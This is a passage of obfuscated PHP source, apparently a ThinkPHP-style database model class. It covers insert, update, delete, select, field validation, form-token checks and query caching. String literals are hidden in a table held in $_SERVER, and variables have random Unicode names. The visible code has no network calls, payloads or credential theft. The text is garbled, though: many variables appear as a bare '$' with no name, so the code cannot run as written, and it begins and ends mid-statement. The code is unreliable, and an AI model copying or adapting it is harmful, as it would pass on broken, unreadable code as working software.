$[341] . $)) { array_unshift($ԋ, $); return call_user_func_array(array($this, $[342]), $ԋ); } else { return call_user_func_array(array(parent, $), $ԋ); } } protected function call() { $ޝ =& $_SERVER[ܮ]; $Ɩ̕ = func_get_args(); $ճ = array_shift($Ɩ̕); $ = $ճ; if (is_array($ճ)) { $ = $ճ[1]; $ճ = $ճ[0]; } $Ե = count($Ɩ̕) - 1; if (isset($Ɩ̕[$Ե]) && $Ɩ̕[$Ե] === $ճ) { think_exception(__CLASS__ . $ޝ[4] . $ճ . think_lang($ޝ[343])); return; } $Ɩ̕[] = $ճ; if (method_exists($this, $ޝ[344])) { $Ж = call_user_func_array(array($this, $ޝ[345]), array($, $Ɩ̕)); if (!is_null($Ж) && $Ж !== !1) { return $Ж; } } $ = !1; if (method_exists($this, $ճ)) { $ = call_user_func_array(array($this, $ճ), $Ɩ̕); } if (method_exists($this, $ޝ[346])) { $Ж = call_user_func_array(array($this, $ޝ[347]), array($, $Ɩ̕, $)); if ($Ж) { return $Ж; } } return $; } protected function _initialize() { } protected function _facade($廸) { $ =& $_SERVER[ܮ]; if (!empty($this->fields)) { foreach ($廸 as $ => $ʥб) { if (is_array($this->fields) && !in_array($, $this->fields, !0)) { unset($廸[$]); } elseif (is_scalar($ʥб)) { $this->_parseType($廸, $); } } } if (!empty($this->options[$[348]])) { $廸 = array_map($this->options[$[348]], $廸); unset($this->options[$[348]]); } $this->_beforeWrite($廸); return $廸; } protected function _beforeWrite(&$) { } public function add($Ä = '', $ = array(), $ = false) { if (empty($Ä)) { if (!empty($this->data)) { $Ä = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ܮ][349]); return !1; } } $ = $this->_parseOptions($); $Ä = $this->_facade($Ä); if (!1 === $this->_beforeInsert($Ä, $)) { return !1; } $׃ = $this->db->insert($Ä, $, $); if (!1 !== $׃) { $ծ = $this->getLastInsID(); if ($ծ) { $Ä[$this->getPk()] = $ծ; $this->_after_insert($Ä, $); return $ծ; } $this->_after_insert($Ä, $); } return $׃; } protected function _beforeInsert(&$⠗, $ɠ) { } protected function _after_insert($, $臾) { } public function addAll($߭״, $ = array(), $ë = false) { $ =& $_SERVER[ܮ]; if (empty($߭״)) { $this->error = think_lang($[349]); return !1; } $ = $this->_parseOptions($); foreach ($߭״ as $˓ => $) { $߭״[$˓] = $this->_facade($); } if (method_exists($this->db, $[350])) { $񠷂 = $this->db->insertAll($߭״, $, $ë); } else { $this->startTrans(); foreach ($߭״ as $˓ => $) { $񠷂 = $this->db->insert($, $, $ë); } $this->commit(); } if (!1 !== $񠷂) { $⋈ = $this->getLastInsID(); if ($⋈) { return $⋈; } } return $񠷂; } public function selectAdd($л = '', $܅ = '', $ = array()) { $ӡП =& $_SERVER[ܮ]; $ = $this->_parseOptions($); if (!1 === ($ = $this->db->selectInsert($л ? $л : $[$ӡП[351]], $܅ ? $܅ : $this->getTableName(), $))) { $this->error = think_lang($ӡП[352]); return !1; } else { return $; } } public function save($Շ = '', $ӓ = array()) { $Ǖ =& $_SERVER[ܮ]; if (empty($Շ)) { if (!empty($this->data)) { $Շ = $this->data; $this->data = array(); } else { $this->error = think_lang($Ǖ[349]); return !1; } } $Շ = $this->_facade($Շ); $ӓ = $this->_parseOptions($ӓ); $ = $this->getPk(); if (!isset($ӓ[$Ǖ[353]])) { if (isset($Շ[$])) { $Ѱ[$] = $Շ[$]; $ӓ[$Ǖ[353]] = $Ѱ; unset($Շ[$]); } else { $this->error = think_lang($Ǖ[352]); return !1; } } if (is_array($ӓ[$Ǖ[353]]) && isset($ӓ[$Ǖ[353]][$])) { $ǯ = $ӓ[$Ǖ[353]][$]; } if (!1 === $this->_beforeUpdate($Շ, $ӓ)) { return !1; } $ = $this->db->update($Շ, $ӓ); if (!1 !== $) { if (isset($ǯ)) { $Շ[$] = $ǯ; } $this->_afterUpdate($Շ, $ӓ); } return $; } protected function _beforeUpdate(&$ǵ, $) { } protected function _afterUpdate($, $ū) { } public function delete($ = array()) { $ëȪ =& $_SERVER[ܮ]; if (empty($) && empty($this->options[$ëȪ[353]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ܯ = $this->getPk(); if (is_numeric($) || is_string($)) { if (strpos($, $ëȪ[50])) { $۷[$ܯ] = array($ëȪ[354], $); } else { $۷[$ܯ] = $; } $this->options[$ëȪ[353]] = $۷; } $ = $this->_parseOptions(); if (is_array($[$ëȪ[353]]) && isset($[$ëȪ[353]][$ܯ])) { $ڨ = $[$ëȪ[353]][$ܯ]; } $Ȧ؃ = $this->db->delete($); if (!1 !== $Ȧ؃) { $؇ = array(); if (isset($ڨ)) { $؇[$ܯ] = $ڨ; } $this->_after_delete($؇, $); } return $Ȧ؃; } protected function _after_delete($, $) { } public function select($ݝ = array()) { $ =& $_SERVER[ܮ]; if (is_string($ݝ) || is_numeric($ݝ)) { $ = $this->getPk(); if (strpos($ݝ, $[50])) { $[$] = array($[354], $ݝ); } else { $[$] = $ݝ; } $this->options[$[353]] = $; } elseif (!1 === $ݝ) { $ݝ = $this->_parseOptions(); return $[355] . $this->db->buildSelectSql($ݝ) . $[356]; } $ݝ = $this->_parseOptions(); $ԹƝ = $this->db->select($ݝ); if (!1 === $ԹƝ) { return !1; } if (empty($ԹƝ)) { return null; } $this->_afterSelect($ԹƝ, $ݝ); return $ԹƝ; } protected function _afterSelect(&$˳, $ߕ) { } public function buildSql($ߺ = array()) { $ڱ =& $_SERVER[ܮ]; $ߺ = $this->_parseOptions($ߺ); return $ڱ[355] . $this->db->buildSelectSql($ߺ) . $ڱ[356]; } public function optionsValue($ = null) { if (is_null($)) { return $this->options; } elseif (is_array($)) { $this->options = array_merge($this->options, $); } } protected function _parseOptions($椫 = array()) { $ =& $_SERVER[ܮ]; if (is_array($椫)) { $椫 = array_merge($this->options, $椫); } $this->options = array(); if (!isset($椫[$[357]])) { $椫[$[357]] = $this->getTableName(); $ύ = $this->fields; } else { $ύ = $this->getDbFields(); } if (!empty($椫[$[358]])) { $椫[$[357]] .= $[53] . $椫[$[358]]; } $椫[$[359]] = $this->name; if (isset($椫[$[353]]) && is_array($椫[$[353]]) && !empty($ύ) && !isset($椫[$[360]]) && !isset($椫[$[357]])) { foreach ($椫[$[353]] as $ƛ => $כ) { $ƛ = trim($ƛ); if (in_array($ƛ, $ύ, !0)) { if (is_scalar($כ)) { $this->_parseType($椫[$[353]], $ƛ); } } elseif (!is_numeric($ƛ) && $[11] != substr($ƛ, 0, 1) && !1 === strpos($ƛ, $[10]) && !1 === strpos($ƛ, $[337]) && !1 === strpos($ƛ, $[212]) && !1 === strpos($ƛ, $[284])) { unset($椫[$[353]][$ƛ]); } } } $this->_options_filter($椫); return $椫; } protected function _options_filter(&$) { } protected function _parseType(&$, $Т) { $ =& $_SERVER[ܮ]; if (empty($this->options[$[361]][$[4] . $Т])) { $ܐ = strtolower($this->fields[$[329]][$Т]); if (!1 !== strpos($ܐ, $[362])) { } elseif (!1 === strpos($ܐ, $[363]) && !1 !== strpos($ܐ, $[364])) { $[$Т] = intval($[$Т]); } elseif (!1 !== strpos($ܐ, $[365]) || !1 !== strpos($ܐ, $[366])) { $[$Т] = floatval($[$Т]); } elseif (!1 !== strpos($ܐ, $[367])) { $[$Т] = (bool) $[$Т]; } } } public function find($智Ξ = array()) { $Ӛ =& $_SERVER[ܮ]; if (is_numeric($智Ξ) || is_string($智Ξ)) { $[$this->getPk()] = intval($智Ξ); $this->options[$Ӛ[353]] = $; } $this->options[$Ӛ[368]] = 1; $智Ξ = $this->_parseOptions(); $ݠ = $this->db->select($智Ξ); if (!1 === $ݠ) { return !1; } if (empty($ݠ)) { return null; } $ă = $ݠ[0]; $this->_afterFind($ă, $智Ξ); return $ă; } protected function _afterFind(&$Ӱ, $) { } protected function returnResult($, $Ĳ׍ = '') { $ޞ =& $_SERVER[ܮ]; if ($Ĳ׍) { if (is_callable($Ĳ׍)) { return call_user_func($Ĳ׍, $); } switch (strtolower($Ĳ׍)) { case $ޞ[369]: return json_encode($); case $ޞ[370]: return xml_encode($); } } return $; } public function parseFieldsMap($, $񪒼 = 1) { if (!empty($this->_map)) { foreach ($this->_map as $͋ => $) { if ($񪒼 == 1) { if (isset($[$])) { $[$͋] = $[$]; unset($[$]); } } else { if (isset($[$͋])) { $[$] = $[$͋]; unset($[$͋]); } } } } return $; } public function setField($, $߄ = '') { if (is_array($)) { $Ō = $; } else { $Ō[$] = $߄; } return $this->save($Ō); } public function setAdd($Ǆ, $ڋ = 1) { $ =& $_SERVER[ܮ]; $ވƒ = $Ǆ . $[371] . $ڋ; if ($ڋ < 0) { $ވƒ = $Ǆ . $ڋ; } return $this->setField($Ǆ, array($[372], $ވƒ)); } public function getField($彑, $ = null) { $ =& $_SERVER[ܮ]; $Տ[$[351]] = $彑; $Տ = $this->_parseOptions($Տ); $彑 = trim($彑); if (strpos($彑, $[50])) { if (!isset($Տ[$[368]])) { $Տ[$[368]] = is_numeric($) ? $ : $[12]; } $ڶ = $this->db->select($Տ); if (!empty($ڶ)) { $۳ = explode($[50], $彑); $彑 = array_keys($ڶ[0]); $ = array_shift($彑); $럜 = array_shift($彑); $뿌 = array(); $ = count($۳); foreach ($ڶ as $ͫǊ) { $؊ = $ͫǊ[$]; if (2 == $) { $뿌[$؊] = $ͫǊ[$럜]; } else { $뿌[$؊] = is_string($) ? implode($, $ͫǊ) : $ͫǊ; } } return $뿌; } } else { if (!0 !== $) { $Տ[$[368]] = is_numeric($) ? $ : 1; } if ($ === $[332]) { unset($Տ[$[368]]); } $ͫǊ = $this->db->select($Տ); if (!empty($ͫǊ)) { if ($ === $[332]) { return reset($ͫǊ[0]); } if (!0 !== $ && 1 == $Տ[$[368]]) { return reset($ͫǊ[0]); } foreach ($ͫǊ as $ٮ) { $[] = $ٮ[$彑]; } return $; } } return null; } public function create($ů = '', $ڷ = '') { $Ɍ =& $_SERVER[ܮ]; if (empty($ů)) { $ů = $_POST; } elseif (is_object($ů)) { $ů = get_object_vars($ů); } if (empty($ů) || !is_array($ů)) { $this->error = think_lang($Ɍ[349]); return !1; } $ů = $this->parseFieldsMap($ů, 0); $ڷ = $ڷ ? $ڷ : (!empty($ů[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ɍ[351]])) { $ѝʍ = $this->options[$Ɍ[351]]; unset($this->options[$Ɍ[351]]); } elseif ($ڷ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ѝʍ = $this->insertFields; } elseif ($ڷ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ѝʍ = $this->updateFields; } if (isset($ѝʍ)) { if (is_string($ѝʍ)) { $ѝʍ = explode($Ɍ[50], $ѝʍ); } if (think_config($Ɍ[373])) { $ѝʍ[] = think_config($Ɍ[374]); } foreach ($ů as $Ԝ => $) { if (!in_array($Ԝ, $ѝʍ)) { unset($ů[$Ԝ]); } } } if (!$this->autoValidation($ů, $ڷ)) { return !1; } if (!$this->autoCheckToken($ů)) { $this->error = think_lang($Ɍ[375]); return !1; } if ($this->autoCheckFields) { $ѝʍ = $this->getDbFields(); foreach ($ů as $Ԝ => $) { if (!in_array($Ԝ, $ѝʍ)) { unset($ů[$Ԝ]); } elseif (MAGIC_QUOTES_GPC && is_string($)) { $ů[$Ԝ] = stripslashes($); } } } $this->autoOperation($ů, $ڷ); $this->data = $ů; return $ů; } public function autoCheckToken($Ɯǐ) { $Ϥ =& $_SERVER[ܮ]; if (isset($this->options[$Ϥ[376]]) && !$this->options[$Ϥ[376]]) { return !0; } if (think_config($Ϥ[373])) { $ = think_config($Ϥ[374]); if (!isset($Ɯǐ[$]) || Session::get($)) { return !1; } list($Åș, $) = explode($Ϥ[11], $Ɯǐ[$]); if ($ && Session::get($ . $Ϥ[10] . $Åș) === $) { Session::remove($ . $Ϥ[10] . $Åș); return !0; } if (think_config($Ϥ[377])) { Session::remove($ . $Ϥ[10] . $Åș); } return !1; } return !0; } public function regex($ߡ, $ۅѴ) { $ =& $_SERVER[ܮ]; $ = array($[378] => $[379], $[380] => $[381], $[382] => $[383], $[384] => $[385], $[386] => $[387], $[388] => $[389], $[390] => $[391], $[366] => $[392], $[393] => $[394]); if (isset($[strtolower($ۅѴ)])) { $ۅѴ = $[strtolower($ۅѴ)]; } return preg_match($ۅѴ, $ߡ) === 1; } private function autoOperation(&$, $) { $үÚ =& $_SERVER[ܮ]; if (!empty($this->options[$үÚ[395]])) { $ڊ = $this->options[$үÚ[395]]; unset($this->options[$үÚ[395]]); } elseif (!empty($this->_auto)) { $ڊ = $this->_auto; } if (isset($ڊ)) { foreach ($ڊ as $͈󝲻) { if (empty($͈󝲻[2])) { $͈󝲻[2] = THINK_MODEL_INSERT; } if ($ == $͈󝲻[2] || $͈󝲻[2] == THINK_MODEL_BOTH) { switch (trim($͈󝲻[3])) { case $үÚ[396]: case $үÚ[397]: $Ҽ = isset($͈󝲻[4]) ? (array) $͈󝲻[4] : array(); if (isset($[$͈󝲻[0]])) { array_unshift($Ҽ, $[$͈󝲻[0]]); } if ($үÚ[396] == $͈󝲻[3]) { $[$͈󝲻[0]] = call_user_func_array($͈󝲻[1], $Ҽ); } else { $[$͈󝲻[0]] = call_user_func_array(array(&$this, $͈󝲻[1]), $Ҽ); } break; case $үÚ[351]: $[$͈󝲻[0]] = $[$͈󝲻[1]]; break; case $үÚ[398]: if ($үÚ[12] === $[$͈󝲻[0]]) { unset($[$͈󝲻[0]]); } break; case $үÚ[399]: default: $[$͈󝲻[0]] = $͈󝲻[1]; } if (!1 === $[$͈󝲻[0]]) { unset($[$͈󝲻[0]]); } } } } return $; } protected function autoValidation($, $夀) { $ĳه =& $_SERVER[ܮ]; if (!empty($this->options[$ĳه[400]])) { $۪ = $this->options[$ĳه[400]]; unset($this->options[$ĳه[400]]); } elseif (!empty($this->_validate)) { $۪ = $this->_validate; } if (isset($۪)) { if ($this->patchValidate) { $this->error = array(); } foreach ($۪ as $Йљ => $) { if (empty($[5]) || $[5] == THINK_MODEL_BOTH || $[5] == $夀) { if (0 == strpos($[2], $ĳه[401]) && strpos($[2], $ĳه[402])) { $[2] = think_lang(substr($[2], 2, -1)); } $[3] = isset($[3]) ? $[3] : THINK_EXISTS_VALIDATE; $[4] = isset($[4]) ? $[4] : $ĳه[403]; switch ($[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($, $)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ĳه[12] != trim($[$[0]])) { if (!1 === $this->_validationField($, $)) { return !1; } } break; default: if (isset($[$[0]])) { if (!1 === $this->_validationField($, $)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ы, $) { if (!1 === $this->_validationFieldItem($ы, $)) { if ($this->patchValidate) { $this->error[$[0]] = $[2]; } else { $this->error = $[2]; return !1; } } return; } protected function _validationFieldItem($, $ܴ嗝) { $ޞ =& $_SERVER[ܮ]; switch (strtolower(trim($ܴ嗝[4]))) { case $ޞ[396]: case $ޞ[397]: $뵑 = isset($ܴ嗝[6]) ? (array) $ܴ嗝[6] : array(); if (is_string($ܴ嗝[0]) && strpos($ܴ嗝[0], $ޞ[50])) { $ܴ嗝[0] = explode($ޞ[50], $ܴ嗝[0]); } if (is_array($ܴ嗝[0])) { foreach ($ܴ嗝[0] as $ΏΧ) { $ҠÙ[$ΏΧ] = $[$ΏΧ]; } array_unshift($뵑, $ҠÙ); } else { array_unshift($뵑, $[$ܴ嗝[0]]); } if ($ޞ[396] == $ܴ嗝[4]) { return call_user_func_array($ܴ嗝[1], $뵑); } else { return call_user_func_array(array(&$this, $ܴ嗝[1]), $뵑); } case $ޞ[404]: return $[$ܴ嗝[0]] == $[$ܴ嗝[1]]; case $ޞ[405]: if (is_string($ܴ嗝[0]) && strpos($ܴ嗝[0], $ޞ[50])) { $ܴ嗝[0] = explode($ޞ[50], $ܴ嗝[0]); } $ = array(); if (is_array($ܴ嗝[0])) { foreach ($ܴ嗝[0] as $ΏΧ) { $[$ΏΧ] = $[$ΏΧ]; } } else { $[$ܴ嗝[0]] = $[$ܴ嗝[0]]; } if (!empty($[$this->getPk()])) { $[$this->getPk()] = array($ޞ[406], $[$this->getPk()]); } if ($this->where($)->find()) { return !1; } return !0; default: return $this->check($[$ܴ嗝[0]], $ܴ嗝[1], $ܴ嗝[4]); } } public function check($, $Ԓݥ, $܅ = "\x72\145\147\x65\x78") { $Ӝ =& $_SERVER[ܮ]; $܅ = strtolower(trim($܅)); switch ($܅) { case $Ӝ[7]: case $Ӝ[407]: $ۦ = is_array($Ԓݥ) ? $Ԓݥ : explode($Ӝ[50], $Ԓݥ); return $܅ == $Ӝ[7] ? in_array($, $ۦ) : !in_array($, $ۦ); case $Ӝ[408]: case $Ӝ[409]: if (is_array($Ԓݥ)) { $ʶ = $Ԓݥ[0]; $ʩ = $Ԓݥ[1]; } else { list($ʶ, $ʩ) = explode($Ӝ[50], $Ԓݥ); } return $܅ == $Ӝ[408] ? $ >= $ʶ && $ <= $ʩ : $ < $ʶ || $ > $ʩ; case $Ӝ[410]: case $Ӝ[411]: return $܅ == $Ӝ[410] ? $ == $Ԓݥ : $ != $Ԓݥ; case $Ӝ[412]: $Ȣ = mb_strlen($, $Ӝ[413]); if (strpos($Ԓݥ, $Ӝ[50])) { list($ʶ, $ʩ) = explode($Ӝ[50], $Ԓݥ); return $Ȣ >= $ʶ && $Ȣ <= $ʩ; } else { return $Ȣ == $Ԓݥ; } case $Ӝ[414]: list($, $) = explode($Ӝ[50], $Ԓݥ); if (!is_numeric($)) { $ = strtotime($); } if (!is_numeric($)) { $ = strtotime($); } return NOW_TIME >= $ && NOW_TIME <= $; case $Ӝ[415]: return in_array(get_client_ip(), explode($Ӝ[50], $Ԓݥ)); case $Ӝ[416]: return !in_array(get_client_ip(), explode($Ӝ[50], $Ԓݥ)); case $Ӝ[403]: default: return $this->regex($, $Ԓݥ); } } public function query($, $Ą = false) { $Ǐ =& $_SERVER[ܮ]; if (!is_bool($Ą) && !is_array($Ą)) { $Ą = func_get_args(); array_shift($Ą); } $ = str_replace(array($Ǐ[285], $Ǐ[417]), $Ǐ[53], $); $ = $this->parseSql($, $Ą); return $this->db->query($); } public function execute($, $ = false) { if (!is_bool($) && !is_array($)) { $ = func_get_args(); array_shift($); } $ = $this->parseSql($, $); return $this->db->execute($); } protected function parseSql($, $) { $澏 =& $_SERVER[ܮ]; if (!0 === $) { $Ċ = $this->_parseOptions(); $ = $this->db->parseSql($, $Ċ); } elseif (is_array($)) { $ = array_map(array($this->db, $澏[418]), $); $ = vsprintf($, $); } else { $ = strtr($, array($澏[419] => $this->getTableName(), $澏[420] => think_config($澏[321]))); } $this->db->setModel($this->name); return $; } public function db($ = '', $ӳٍ = '', $ղ = array()) { $ =& $_SERVER[ܮ]; if ($[12] === $ && $this->db) { return $this->db; } static $ԫ = array(); static $џÀ = array(); if (!isset($џÀ[$]) || isset($џÀ[$]) && $ӳٍ && $ԫ[$] != $ӳٍ) { if (!empty($ӳٍ) && is_string($ӳٍ) && !1 === strpos($ӳٍ, $[8])) { $ӳٍ = think_config($ӳٍ); } $ = think_guid($ӳٍ); $џÀ[$] = Db::getInstance($ӳٍ); } elseif (NULL === $ӳٍ) { $џÀ[$]->close(); unset($џÀ[$]); return; } if (!empty($ղ)) { if (is_string($ղ)) { parse_str($ղ, $ղ); } foreach ($ղ as $ => $) { $this->setProperty($, $); } } $ԫ[$] = $ӳٍ; $this->db = $џÀ[$]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ = get_class($this); if ($ == $_SERVER[ܮ][421]) { return $this->name; } $this->name = substr($, 0, -5); } return $this->name; } public function getTableName() { $ȴ =& $_SERVER[ܮ]; if (empty($this->trueTableName)) { $ = !empty($this->tablePrefix) ? $this->tablePrefix : $ȴ[12]; if (!empty($this->tableName)) { $ .= $this->tableName; } else { $ .= think_parse_name($this->name); } $this->trueTableName = strtolower($); } return (!empty($this->dbName) ? $this->dbName . $ȴ[10] : $ȴ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Ŵ =& $_SERVER[ܮ]; return isset($this->fields[$Ŵ[328]]) ? $this->fields[$Ŵ[328]] : $this->pk; } public function getDbFields() { $Ք =& $_SERVER[ܮ]; if (isset($this->options[$Ք[357]])) { $ = $this->db->getFields($this->options[$Ք[357]]); return $ ? array_keys($) : !1; } if ($this->fields) { $ = $this->fields; unset($[$Ք[327]], $[$Ք[328]], $[$Ք[329]], $[$Ք[326]]); return $; } return !1; } public function data($ơ = '') { $ΰ =& $_SERVER[ܮ]; if ($ΰ[12] === $ơ && !empty($this->data)) { return $this->data; } if (is_object($ơ)) { $ơ = get_object_vars($ơ); } elseif (is_string($ơ)) { parse_str($ơ, $ơ); } elseif (!is_array($ơ)) { think_exception(think_lang($ΰ[349])); } $this->data = $ơ; return $this; } public function join($պ) { $ =& $_SERVER[ܮ]; if (is_array($պ)) { $this->options[$[360]] = $պ; } elseif (!empty($պ)) { $this->options[$[360]][] = $պ; } return $this; } public function union($Ø, $ꧫ = false) { $֩ =& $_SERVER[ܮ]; if (empty($Ø)) { return $this; } if ($ꧫ) { $this->options[$֩[422]][$֩[423]] = !0; } if (is_object($Ø)) { $Ø = get_object_vars($Ø); } if (is_string($Ø)) { $ = $Ø; } elseif (is_array($Ø)) { if (isset($Ø[0])) { $this->options[$֩[422]] = array_merge($this->options[$֩[422]], $Ø); return $this; } else { $ = $Ø; } } else { think_exception(think_lang($֩[349])); } $this->options[$֩[422]][] = $; return $this; } public function cache($ = true, $ = null, $ѥ = '') { $䤕 =& $_SERVER[ܮ]; if (!1 !== $) { $this->options[$䤕[424]] = array($䤕[95] => $, $䤕[414] => $, $䤕[33] => $ѥ); } return $this; } public function field($㘧, $Ä = false) { $ =& $_SERVER[ܮ]; if (!0 === $㘧) { $ = $this->getDbFields(); $㘧 = $ ? $ : $[220]; } elseif ($Ä) { if (is_string($㘧)) { $㘧 = explode($[50], $㘧); } $ = $this->getDbFields(); $㘧 = $ ? array_diff($, $㘧) : $㘧; } $this->options[$[351]] = $㘧; return $this; } public function scope($Ɍ = '', $ = NULL) { $ =& $_SERVER[ܮ]; if ($[12] === $Ɍ) { if (isset($this->_scope[$[37]])) { $ = $this->_scope[$[37]]; } else { return $this; } } elseif (is_string($Ɍ)) { $ = explode($[50], $Ɍ); $ = array(); foreach ($ as $) { if (!isset($this->_scope[$])) { continue; } $ = array_merge($, $this->_scope[$]); } if (!empty($) && is_array($)) { $ = array_merge($, $); } } elseif (is_array($Ɍ)) { $ = $Ɍ; } if (is_array($) && !empty($)) { $this->options = array_merge($this->options, array_change_key_case($)); } return $this; } public function where($Ǵ, $ֽ = null) { $᠗ =& $_SERVER[ܮ]; if (!is_null($ֽ) && is_string($Ǵ)) { if (!is_array($ֽ)) { $ֽ = func_get_args(); array_shift($ֽ); } $ֽ = array_map(array($this->db, $᠗[418]), $ֽ); $Ǵ = vsprintf($Ǵ, $ֽ); } elseif (is_object($Ǵ)) { $Ǵ = get_object_vars($Ǵ); } elseif (is_array($Ǵ)) { foreach ($Ǵ as $֮ => $۴) { if ((is_numeric($֮) || !$֮) && is_string($۴)) { if (strpos($۴, $᠗[425]) === 0) { continue; } think_trace($᠗[426], $᠗[12], $᠗[49]); die; } } } if (is_string($Ǵ) && $᠗[12] != $Ǵ) { $ = array(); $[$᠗[427]] = $Ǵ; $Ǵ = $; } if (isset($this->options[$᠗[353]])) { $this->options[$᠗[353]] = array_merge($this->options[$᠗[353]], $Ǵ); } else { $this->options[$᠗[353]] = $Ǵ; } return $this; } public function limit($, $䋞 = null) { $ =& $_SERVER[ܮ]; $this->options[$[368]] = is_null($䋞) ? $ : $ . $[50] . $䋞; return $this; } public function page($, $灱 = null) { $ۿڽ =& $_SERVER[ܮ]; $this->options[$ۿڽ[428]] = is_null($灱) ? $ : $ . $ۿڽ[50] . $灱; return $this; } public function comment($) { $this->options[$_SERVER[ܮ][429]] = $; return $this; } public function setProperty($Ł, $) { if (property_exists($this, $Ł)) { $this->{$Ł} = $; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\151\155\x65", "\164\x69\x6d\x65", "\151\156\163\145\x72\164\54\165\160\x64\x61\164\145", "\146\165\156\x63\164\x69\157\156"), array("\143\162\145\141\164\145\x54\x69\x6d\145", "\x74\x69\155\x65", "\x69\x6e\163\x65\162\164", "\146\165\156\143\x74\x69\157\156")); public function setDataAuto($Ƹ) { $this->dataAuto = $Ƹ; } public function __construct($ȉϽ = '', $ڌ = '', $Łʮ = '') { parent::__construct($ȉϽ, $ڌ, $Łʮ); } protected $tableMeta = array(); protected function _beforeInsert(&$, $ꚉ) { $לٚ =& $_SERVER[ܮ]; if (!$this->checkDataAutoHas($לٚ[430])) { return; } $this->dataBeforeFilter($, $לٚ[430]); } protected function _beforeUpdate(&$, $) { $ =& $_SERVER[ܮ]; if (!$this->checkDataAutoHas($[431])) { return; } $this->dataBeforeFilter($, $[431]); } protected function _afterSelect(&$, $Ѕ) { if (!is_array($)) { return; } if (!$this->checkDataAutoHas($_SERVER[ܮ][432])) { return; } foreach ($ as &$) { $this->dataAfterFilter($); } unset($); } protected function _afterFind(&$, $͛ٸ) { if (!is_array($)) { return; } if (!$this->checkDataAutoHas($_SERVER[ܮ][432])) { return; } $this->dataAfterFilter($); } public static function textEncode($贅) { if (!$贅) { return $贅; } $׆偣 = json_encode($贅); $׆偣 = preg_replace_callback($_SERVER[ܮ][433], function ($) { return addslashes($[0]); }, $׆偣); return json_decode($׆偣); } public static function textDecode($) { $˓ =& $_SERVER[ܮ]; if (!$) { return $; } $ = json_encode($); $ = preg_replace_callback($˓[434], function ($Ŵ) { return $_SERVER[ܮ][97]; }, $); return json_decode($); } public function setAutoIncrement($啗) { $ = array($this->getPk() => $啗); $ = $this->data($)->add(); if ($) { $this->delete($); } } public function getAutoIncrement() { $ՠŘ = $this->getTableName(); $ = $this->max($this->getPk()); $펼 = $this->query("\163\x68\157\167\40\x74\141\142\x6c\x65\40\163\164\141\x74\165\x73\40\167\x68\x65\162\145\x20\x4e\141\x6d\145\x3d\x27{$ՠŘ}\47"); $۳ = $펼[0][$_SERVER[ܮ][435]]; $ƶ = max($, $۳); return $ƶ; } protected function _callBefore($񖘧, $نγ) { return $this->cacheCallCheck($񖘧, $نγ, !1); } protected function _callAfter($, $) { return $this->cacheCallCheck($, $, !0); } protected function cacheFunctionAlias($) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($, $ߑ黖, $ǟ = false) { $׏ۼ =& $_SERVER[ܮ]; $ = $this->cacheFunctionAlias($ߑ黖); if (!$) { return; } foreach ($ as $޳ => $ֺ) { $҂̇ = $ֺ[0]; $霁 = explode($׏ۼ[50], $ֺ[1]); $ = isset($ֺ[2]) ? $ֺ[2] : $׏ۼ[12]; if ($ == $޳) { return $this->cacheFunctionGet($޳, $҂̇, $); } if ($ǟ && in_array($, $霁)) { $this->cacheFunctionClear($޳, $҂̇, $); } } } public function cacheFunctionGet($ʠ, $, $ = '') { $ǫ =& $_SERVER[ܮ]; $͙ŷֺ = $this->cacheKeyMake($ʠ, $, $); $ = Cache::get($͙ŷֺ); if (!is_array($)) { if (method_exists($this, $ǫ[341] . $ʠ)) { $ʠ = $ǫ[341] . $ʠ; } $ = call_user_func_array(array($this, $ʠ), array($, !0)); Cache::set($͙ŷֺ, $); } return $; } public function cacheFunctionClear($қ, $ꏒ, $ = '') { $ٺ = $ꏒ; if (!is_array($ꏒ)) { $ٺ = array($ꏒ); } foreach ($ٺ as $ұ) { $ی = $this->cacheKeyMake($қ, $ұ, $); Cache::remove($ی); } } public function cacheKeyMake($, $ǥ, $) { $֝ =& $_SERVER[ܮ]; if ($) { $ǥ = $ǥ . $֝[436] . $; } return get_class($this) . $֝[11] . $ . $֝[437] . $ǥ; } protected function selectPageReset() { $Ĺ =& $_SERVER[ܮ]; if (isset($GLOBALS[$Ĺ[438]])) { return; } $GLOBALS[$Ĺ[438]] = isset($GLOBALS[$Ĺ[7]][$Ĺ[439]]) ? $GLOBALS[$Ĺ[7]][$Ĺ[439]] : !1; $GLOBALS[$Ĺ[440]] = isset($GLOBALS[$Ĺ[7]][$Ĺ[428]]) ? $GLOBALS[$Ĺ[7]][$Ĺ[428]] : !1; $GLOBALS[$Ĺ[7]][$Ĺ[439]] = !1; $GLOBALS[$Ĺ[7]][$Ĺ[428]] = !1; } protected function selectPageRestore() { $ =& $_SERVER[ܮ]; if (!isset($GLOBALS[$[438]])) { return; } $GLOBALS[$[7]][$[439]] = $GLOBALS[$[438]]; $GLOBALS[$[7]][$[428]] = $GLOBALS[$[440]]; if ($GLOBALS[$[7]][$[439]] === !1) { unset($GLOBALS[$[7]][$[439]]); } if ($GLOBALS[$[7]][$[428]] === !1) { unset($GLOBALS[$[7]][$[428]]); } unset($GLOBALS[$[438]]); unset($GLOBALS[$[440]]); } protected function selectPage($ꭁ = 200, $٢ޯ = 1) { $ނ =& $_SERVER[ܮ]; global $in; $ = $this->optionsValue(); $ة = 100000; $ꭁ = isset($in[$ނ[439]]) && $in[$ނ[439]] ? $in[$ނ[439]] : 